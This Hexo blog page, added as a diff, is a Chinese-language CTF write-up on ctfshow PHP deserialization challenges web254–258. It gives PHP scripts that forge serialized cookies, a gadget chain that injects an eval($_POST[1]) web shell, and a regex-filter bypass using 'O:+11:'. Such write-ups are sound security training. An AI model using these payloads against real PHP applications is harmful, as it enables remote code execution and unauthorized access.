@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>ctfshow-反序列化254~260 | Karryonr</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="web254（开始反序列化）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow-反序列化254~260">
+<meta property="og:url" content="http://example.com/2021/11/14/ctfshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96254-260/index.html">
+<meta property="og:site_name" content="Karryonr">
+<meta property="og:description" content="web254（开始反序列化）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://z3.ax1x.com/2021/11/14/I6neEQ.png">
+<meta property="og:image" content="https://z3.ax1x.com/2021/11/14/I6nHaQ.png">
+<meta property="og:image" content="https://z3.ax1x.com/2021/11/14/I6u0ij.png">
+<meta property="og:image" content="https://z3.ax1x.com/2021/11/14/I6MGb8.png">
+<meta property="og:image" content="https://z3.ax1x.com/2021/11/14/I6MsbT.png">
+<meta property="og:image" content="https://z3.ax1x.com/2021/11/14/I6GYV0.png">
+<meta property="og:image" content="https://z3.ax1x.com/2021/11/14/I6YLvQ.png">
+<meta property="og:image" content="https://z3.ax1x.com/2021/11/14/I6YT4f.png">
+<meta property="og:image" content="https://z3.ax1x.com/2021/11/14/I6tDMQ.png">
+<meta property="og:image" content="https://z3.ax1x.com/2021/11/14/I6Up1U.png">
+<meta property="og:image" content="https://z3.ax1x.com/2021/11/14/I6deyD.png">
+<meta property="article:published_time" content="2021-11-14T01:42:12.000Z">
+<meta property="article:modified_time" content="2021-11-14T04:13:45.639Z">
+<meta property="article:author" content="Karryonr">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z3.ax1x.com/2021/11/14/I6neEQ.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Karryonr" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="https://z3.ax1x.com/2021/11/01/IPWJqe.png">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="https://z3.ax1x.com/2021/11/01/IPWna9.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="https://z3.ax1x.com/2021/11/01/IPWna9.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-ctfshow-反序列化254-260" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/11/14/ctfshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96254-260/" class="article-date">
+  	<time datetime="2021-11-14T01:42:12.000Z" itemprop="datePublished">2021-11-14</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ctfshow-反序列化254~260
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="web254（开始反序列化）"><a href="#web254（开始反序列化）" class="headerlink" title="web254（开始反序列化）"></a>web254（开始反序列化）<span id="more"></span></h2><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/I6neEQ"><img src="https://z3.ax1x.com/2021/11/14/I6neEQ.png" alt="I6neEQ.png"></a></p>
+<p>传入username和password，进入login函数，如果相等则将isVip设置为true，得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c7a6f8b0-51bf-4c74-b8d1-60b12581ea46.challenge.ctf.show/?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure>
+
+<h2 id="web255-开始反序列化"><a href="#web255-开始反序列化" class="headerlink" title="web255(开始反序列化)"></a>web255(开始反序列化)</h2><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/I6nHaQ"><img src="https://z3.ax1x.com/2021/11/14/I6nHaQ.png" alt="I6nHaQ.png"></a></p>
+<p>该题对cookie进行反序列化操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=true;</span><br><span class="line">&#125;</span><br><span class="line">$a = new ctfShowUser();</span><br><span class="line">$b = urlencode(serialize($a));</span><br><span class="line">echo $b;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>cookie字段当中需要url编码一波)(其名称以及存储的字符串值是必须经过URL编码的)</p>
+<p>得到cookie，进行粘贴</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/I6u0ij"><img src="https://z3.ax1x.com/2021/11/14/I6u0ij.png" alt="I6u0ij.png"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://645993ee-3426-42a4-88f8-65984527855c.challenge.ctf.show/?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure>
+
+<h2 id="web256-开始反序列化"><a href="#web256-开始反序列化" class="headerlink" title="web256(开始反序列化)"></a>web256(开始反序列化)</h2><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/I6MGb8"><img src="https://z3.ax1x.com/2021/11/14/I6MGb8.png" alt="I6MGb8.png"></a></p>
+<p>!==是一个弱类型</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/I6MsbT"><img src="https://z3.ax1x.com/2021/11/14/I6MsbT.png" alt="I6MsbT.png"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;1&#x27;;</span><br><span class="line">    public $password=&#x27;2&#x27;;</span><br><span class="line">    public $isVip=true;</span><br><span class="line">&#125;</span><br><span class="line">echo urlencode(serialize(new ctfShowUser()));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie: </span><br><span class="line">O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%222%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&amp;password=2</span><br></pre></td></tr></table></figure>
+
+<h2 id="web257-开始反序列化"><a href="#web257-开始反序列化" class="headerlink" title="web257(开始反序列化)"></a>web257(开始反序列化)</h2><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/I6GYV0"><img src="https://z3.ax1x.com/2021/11/14/I6GYV0.png" alt="I6GYV0.png"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    private $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    private $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    private $isVip=false;</span><br><span class="line">    private $class = &#x27;info&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;class=new backDoor();//修改</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class info&#123;</span><br><span class="line">    private $user=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        return $this-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class backDoor&#123;</span><br><span class="line">    private $code=&#x27;eval($_POST[1]);&#x27;;//对其进行覆盖</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo urlencode(serialize(new ctfShowUser()));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>添加cookie</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/I6YLvQ"><img src="https://z3.ax1x.com/2021/11/14/I6YLvQ.png" alt="I6YLvQ.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/I6YT4f"><img src="https://z3.ax1x.com/2021/11/14/I6YT4f.png" alt="I6YT4f.png"></a></p>
+<h2 id="web258（开始反序列化）"><a href="#web258（开始反序列化）" class="headerlink" title="web258（开始反序列化）"></a>web258（开始反序列化）</h2><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/I6tDMQ"><img src="https://z3.ax1x.com/2021/11/14/I6tDMQ.png" alt="I6tDMQ.png"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&#x27;/[oc]:\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\d:  匹配一个数字字符。等价于 [0-9]。</span><br><span class="line"> +:  匹配前面的子表达式一次或多次。例如，&#x27;zo+&#x27; 能匹配 &quot;zo&quot; 以及 &quot;zoo&quot;，但不能匹配 &quot;z&quot;。+ 等价于 &#123;1,&#125;。</span><br><span class="line">/i:  表示匹配的时候不区分大小写</span><br></pre></td></tr></table></figure>
+
+<p>反序列化内容包含有数字的，能被正则表达式过滤掉。</p>
+<p>在类名长度前加个+即可绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=false;</span><br><span class="line">    public $class = &#x27;info&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;class=new backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class info&#123;</span><br><span class="line">    public $user=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        return $this-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class backDoor&#123;</span><br><span class="line">    public $code;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = serialize(new ctfShowUser());</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/I6Up1U"><img src="https://z3.ax1x.com/2021/11/14/I6Up1U.png" alt="I6Up1U.png"></a></p>
+<p>正好和O:11:和O:8:匹配上了，绕过的方法就是加上＋，O:+11:,O:+8:即可绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">class backDoor&#123;</span><br><span class="line">    public $code=&#x27;eval($_POST[1]);&#x27;;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = serialize(new ctfShowUser());</span><br><span class="line">$b = str_replace(&#x27;:11&#x27;,&#x27;:+11&#x27;,$a);</span><br><span class="line">$c = str_replace(&#x27;:8&#x27;,&#x27;:+8&#x27;,$b);</span><br><span class="line">echo urlencode($c);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到cookie并进行写入</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/I6deyD"><img src="https://z3.ax1x.com/2021/11/14/I6deyD.png" alt="I6deyD.png"></a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/11/01/ctfshow-%E7%88%86%E7%A0%B4web-21-25/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ctfshow 爆破web 21~25</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="ctfshow-反序列化254-260" data-title="ctfshow-反序列化254~260" data-url="http://example.com/2021/11/14/ctfshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96254-260/"  data-images="https://z3.ax1x.com/2021/11/01/IPWna9.jpg" data-content="ctfshow-反序列化254~260">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2021 Karryonr
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
